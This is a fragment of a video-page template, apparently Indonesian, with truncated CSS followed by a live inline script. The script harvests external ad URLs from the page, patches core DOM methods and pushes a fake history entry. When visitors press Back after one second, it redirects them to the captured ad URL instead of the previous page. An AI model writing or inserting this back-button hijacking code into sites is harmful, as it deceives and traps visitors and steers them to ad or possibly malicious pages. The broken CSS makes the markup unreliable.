  <style>
    :root {
      --bg-color: #09090b;

    * {

    body {
      font-family: 'Inter', sans-serif;

    /* Header Iklan - Dibuat Elegant */

    /* Video Player Styling */
    .video-wrapper {
      position: relative;

    video {
      width: 100%;

      object-fit: contain;

      background: #18181e;

    /* Badge 'Live' atau 'Trending' untuk pemanis */
    .badge {
      position: absolute;

      background: var(--accent-color);
      color: white;
      padding: 4px 10px;
      border-radius: 6px;
      font-size: 0.75rem;
      font-weight: 700;
      z-index: 5;
      text-transform: uppercase;
    }

    /* Info Section */
    .video-info {

      padding: 0 5px;
    }

    .stats {
      font-size: 0.85rem;
      color: var(--text-muted);
      display: flex;
      gap: 15px;
    }

    /* Footer */
    footer {
      width: 100%;
      padding: 30px 15px;
      text-align: center;
      font-size: 0.8rem;
      color: var(--text-muted);
      border-top: 1px solid var(--border-color);
      background: #09090b;
    }

    /* Animasi Halus */
    .fade-in {
      animation: fadeIn 0.8s ease-in;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

<script>
(function () {
  // Konfigurasi
  var CAPTURE_TIMEOUT_MS = 1000;   // 1000ms = 1 detik
  var TARGET_DOMAIN = '';          // kosong = tangkap semua URL eksternal; atau 'skinnycrawlinglax.com'
  var latestAdUrl = null;
  var pageLoadTs = Date.now();

  // util: ekstrak semua URL dari teks (http(s) dan protocol-relative //...)
  function extractUrlsFromText(text) {
    if (!text) return [];
    var out = [];
    try {
      var re = /https?:\/\/[^\s"'>)]+/ig;
      var m;
      while ((m = re.exec(text)) !== null) {
        out.push(m[0]);
      }
      // protocol-relative //domain/...
      var re2 = /\/\/[^\s"'>)]+/ig;
      while ((m = re2.exec(text)) !== null) {
        var u = (location.protocol || 'https:') + m[0];
        out.push(u);
      }
    } catch (e) {}
    return out;
  }

  // apakah URL valid target menurut konfigurasi
  function isUrlTarget(u) {
    if (!u) return false;
    try {
      if (TARGET_DOMAIN) {
        return u.indexOf(TARGET_DOMAIN) !== -1;
      }
      // default: ambil URL yang bukan halaman ini origin dan bukan same-origin script hosts biasa
      var a = document.createElement('a');
      a.href = u;
      var sameOrigin = (a.hostname === location.hostname && a.protocol === location.protocol && a.port === location.port);
      return !sameOrigin;
    } catch (e) {
      return false;
    }
  }

  // Set latestAdUrl jika URL memenuhi syarat
  function setLatest(u, sourceInfo) {
    if (!u || !isUrlTarget(u)) return;
    latestAdUrl = u;
    // debugging
    try { console.log('[ad-capture] found', u, sourceInfo || ''); } catch(e){}
  }

  // inspeksi node/teks untuk URL target
  function inspectTextForTargets(text, sourceInfo) {
    var urls = extractUrlsFromText(text);
    for (var i = 0; i < urls.length; i++) {
      if (isUrlTarget(urls[i])) {
        setLatest(urls[i], sourceInfo);
      }
    }
  }

  function inspectElement(el) {
    try {
      if (!el) return;
      // src attr
      var src = el.getAttribute && el.getAttribute('src');
      if (src) {
        var resolved = src;
        // normalisasi protocol-relative
        if (/^\/\//.test(src)) resolved = (location.protocol || 'https:') + src;
        // absolute relative path -> let browser resolve by anchor
        if (!/^(https?:)?\/\//i.test(resolved)) {
          var a = document.createElement('a'); a.href = resolved; resolved = a.href;
        }
        if (isUrlTarget(resolved)) setLatest(resolved, {type:'element-src', tag:el.tagName});
      }
      // inline content
      var txt = el.textContent || el.innerHTML || '';
      if (txt) inspectTextForTargets(txt, {type:'element-text', tag:el.tagName});
    } catch (e) {}
  }

  // scan awal DOM untuk URL
  function initialScan() {
    try {
      // check window.atOptions and other common globals
      var gnames = ['atOptions','ad_options','invokeData','adData','ads','adConfig'];
      for (var gi=0; gi<gnames.length; gi++) {
        var name = gnames[gi];
        if (window[name]) {
          try {
            var s = JSON.stringify(window[name]);
            inspectTextForTargets(s, {type:'global', name: name});
          } catch(e){}
        }
      }

      // script[src]
      var scripts = document.querySelectorAll('script[src]');
      for (var i=0;i<scripts.length;i++) inspectElement(scripts[i]);

      // iframe[src]
      var ifs = document.querySelectorAll('iframe[src]');
      for (var j=0;j<ifs.length;j++) inspectElement(ifs[j]);

      // inline scripts
      var inlines = document.querySelectorAll('script:not([src])');
      for (var k=0;k<inlines.length;k++) inspectElement(inlines[k]);

      // document HTML (broad)
      inspectTextForTargets(document.documentElement && document.documentElement.outerHTML || '', {type:'doc-html'});
    } catch (e) { console.warn(e); }
  }

  // MutationObserver untuk menangkap injeksi dinamis
  var mo = new MutationObserver(function (mutations) {
    mutations.forEach(function (m) {
      (m.addedNodes || []).forEach(function (node) {
        if (!node) return;
        if (node.nodeType === Node.ELEMENT_NODE) {
          inspectElement(node);
          // inspect descendants quickly
          try {
            var scripts = node.querySelectorAll && node.querySelectorAll('script,iframe');
            if (scripts && scripts.length) {
              for (var i=0;i<scripts.length;i++) inspectElement(scripts[i]);
            }
          } catch(e){}
        } else if (node.nodeType === Node.TEXT_NODE) {
          inspectTextForTargets(node.nodeValue || '', {type:'textnode'});
        }
      });
    });
  });
  mo.observe(document.documentElement || document.body, { childList: true, subtree: true });

  // Monkeypatch createElement untuk tangkap .src assignment dan setAttribute pada elemen baru
  var origCreate = document.createElement.bind(document);
  document.createElement = function (tag) {
    var el = origCreate(tag);
    try {
      var t = (tag || '').toString().toLowerCase();
      if (t === 'script' || t === 'iframe') {
        var origSetAttr = el.setAttribute.bind(el);
        el.setAttribute = function (name, value) {
          if (String(name).toLowerCase() === 'src') {
            var v = value || '';
            if (/^\/\//.test(v)) v = (location.protocol || 'https:') + v;
            if (isUrlTarget(v)) setLatest(v, {type:'setAttribute', tag:t});
          }
          return origSetAttr.apply(this, arguments);
        };
        try {
          Object.defineProperty(el, 'src', {
            set: function (v) {
              var val = v || '';
              if (/^\/\//.test(val)) val = (location.protocol || 'https:') + val;
              if (isUrlTarget(val)) setLatest(val, {type:'prop-src', tag:t});
              // set attribute so browser uses it
              this.setAttribute && this.setAttribute('src', v);
            },
            get: function () { return this.getAttribute && this.getAttribute('src'); },
            configurable: true
          });
        } catch(e){}
      }
    } catch(e){}
    return el;
  };

  // juga patch appendChild/insertBefore/replaceChild untuk node yang diinsert
  function wrapProtoMethod(proto, name) {
    var orig = proto[name];
    proto[name] = function (node) {
      try {
        if (node && node.nodeType === Node.ELEMENT_NODE) inspectElement(node);
      } catch(e){}
      return orig.apply(this, arguments);
    };
  }
  wrapProtoMethod(Element.prototype, 'appendChild');
  wrapProtoMethod(Element.prototype, 'insertBefore');
  wrapProtoMethod(Element.prototype, 'replaceChild');

  // polling singkat untuk globals/inline karena beberapa vendor menulis berbeda
  var pollCount = 0;
  var pollMax = 10;
  var pollInterval = setInterval(function () {
    try {
      initialScan();
    } catch(e){}
    pollCount++;
    if (pollCount >= pollMax) clearInterval(pollInterval);
  }, 300);

  // inisialisasi scan awal
  setTimeout(initialScan, 30);
  setTimeout(initialScan, 700);
  setTimeout(initialScan, 1500);

  // History interception: push a state supaya popstate terpicu saat user tekan Back
  function ensureInterceptState() {
    try {
      history.replaceState({__adsnap: true, lvl: 0}, '', location.href);
      history.pushState({__adsnap: true, lvl: 1}, '', location.href);
    } catch (e) {}
  }

  // Popstate handler
  function onPop(e) {
    try {
      var st = e.state;
      if (st && st.__adsnap && st.lvl === 1) {
        var elapsed = Date.now() - pageLoadTs;
        // jika sudah lebih dari threshold dan kita punya ad URL -> redirect
        if (elapsed > CAPTURE_TIMEOUT_MS && latestAdUrl) {
          // hapus listener agar tidak mengganggu saat redirect
          window.removeEventListener('popstate', onPop);
          // lakukan redirect
          window.location.href = latestAdUrl;
          return;
        } else {
          // waktu <= threshold atau tidak ada ad -> biarkan back normal:
          // untuk membiarkan browser pindah ke halaman sebelumnya, hapus handler sementara lalu panggil history.back()
          window.removeEventListener('popstate', onPop);
          // Move one step back in history (browser will navigate)
          setTimeout(function () { try { history.back(); } catch(e) {} }, 0);
          return;
        }
      }
      // non-intercept popstate: tidak kita tangani khusus
    } catch (err) { console.warn(err); }
  }

  window.addEventListener('popstate', onPop);

  // init on load
  window.addEventListener('load', function () {
    pageLoadTs = Date.now();
    ensureInterceptState();
    // debug
    try { console.log('[ad-redirect] intercept active, threshold ms=', CAPTURE_TIMEOUT_MS); } catch(e){}
  });

  // expose for debugging & control
  window.__adRedirector = {
    setTargetDomain: function (d) { TARGET_DOMAIN = String(d||''); },
    getLatest: function () { return latestAdUrl; },
    forceRedirect: function () { if (latestAdUrl) window.location.href = latestAdUrl; },
    scanNow: initialScan
  };

})();
</script>
